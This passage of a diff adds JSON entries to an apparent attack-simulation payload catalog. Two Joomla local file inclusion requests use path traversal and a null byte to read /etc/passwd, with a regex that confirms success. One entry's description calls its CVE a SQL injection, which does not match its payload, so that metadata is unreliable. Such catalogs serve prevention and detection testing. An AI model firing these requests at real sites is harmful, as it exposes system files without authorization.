+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_canteen&controller=../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JE Job 1.0 - Local File Inclusion (Nuclei: CVE-2010-5028)",
+    "payload_external_id": "B8-LFI-140",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-5028 by daffainfo] A SQL injection vulnerability in the JExtensions JE Job (com_jejob) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the catid parameter in an item action to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jejob&view=../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  }
+]
